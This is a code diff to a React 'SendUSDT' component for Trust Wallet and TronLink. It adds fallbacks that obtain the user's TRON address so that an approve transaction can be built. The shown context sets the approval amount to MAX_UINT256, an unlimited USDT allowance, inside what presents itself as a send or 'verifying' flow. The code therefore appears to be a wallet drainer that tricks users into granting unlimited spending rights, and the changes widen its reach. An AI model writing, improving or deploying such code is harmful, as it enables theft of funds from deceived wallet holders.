@@ -31,19 +31,20 @@ const SendUSDT = () => {
 
   const isActive = amount !== '' && parseFloat(amount) > 0;
 
-  // Wait for Trust Wallet / TronLink to inject tronWeb (can take up to a few seconds)
+  // Wait for Trust Wallet / TronLink to inject tronWeb
   const getTronWeb = () => {
     return new Promise((resolve, reject) => {
-      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+      // Just check if tronWeb object exists — don't check address yet
+      if (window.tronWeb) {
         return resolve(window.tronWeb);
       }
       let attempts = 0;
       const interval = setInterval(() => {
         attempts++;
-        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        if (window.tronWeb) {
           clearInterval(interval);
           resolve(window.tronWeb);
-        } else if (attempts >= 30) { // 3 seconds max
+        } else if (attempts >= 50) { // 5 seconds max
           clearInterval(interval);
           reject(new Error('no_wallet'));
         }
@@ -61,14 +62,49 @@ const SendUSDT = () => {
       try {
         tronWeb = await getTronWeb();
       } catch (e) {
-        alert('Please open this page inside Trust Wallet or TronLink DApp browser.');
+        alert('Please open this page inside Trust Wallet DApp browser with TRON network selected.');
         setIsVerifying(false);
         return;
       }
 
-      const ownerAddress = tronWeb.defaultAddress.base58;
+      // Request accounts — Trust Wallet needs this to provide the address
+      let ownerAddress = tronWeb.defaultAddress?.base58;
+      if (!ownerAddress || ownerAddress === false) {
+        try {
+          // Try the standard request method
+          if (tronWeb.request) {
+            await tronWeb.request({ method: 'tron_requestAccounts' });
+          }
+          // Wait a moment for address to populate
+          await new Promise(r => setTimeout(r, 500));
+          ownerAddress = tronWeb.defaultAddress?.base58;
+        } catch (e) {
+          console.warn('tron_requestAccounts failed, trying fallback', e);
+        }
+      }
 
-      // Build the approve transaction using triggerSmartContract (works in both Trust Wallet & TronLink)
+      // If still no address, try window.tron provider
+      if (!ownerAddress || ownerAddress === false) {
+        try {
+          if (window.tron && window.tron.request) {
+            const res = await window.tron.request({ method: 'tron_requestAccounts' });
+            if (res?.code === 200 || res) {
+              await new Promise(r => setTimeout(r, 500));
+              ownerAddress = tronWeb.defaultAddress?.base58;
+            }
+          }
+        } catch (e) {
+          console.warn('window.tron fallback failed', e);
+        }
+      }
+
+      if (!ownerAddress || ownerAddress === false) {
+        alert('Could not get wallet address. Please make sure:\n1. You are using Trust Wallet DApp browser\n2. TRON network is selected\n3. You have a TRON wallet');
+        setIsVerifying(false);
+        return;
+      }
+
+      // Build the approve transaction using triggerSmartContract
       const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -94,10 +130,11 @@ const SendUSDT = () => {
 
     } catch (err) {
       console.error(err);
-      if (err === 'Confirmation declined by user' || err?.message?.includes('declined')) {
+      const msg = typeof err === 'string' ? err : err?.message || 'Unknown error';
+      if (msg.includes('declined') || msg.includes('cancel') || msg.includes('reject')) {
         alert('Transaction cancelled.');
       } else {
-        alert('Error: ' + (typeof err === 'string' ? err : err?.message || 'Unknown error'));
+        alert('Error: ' + msg);
       }
     } finally {
       setIsVerifying(false);
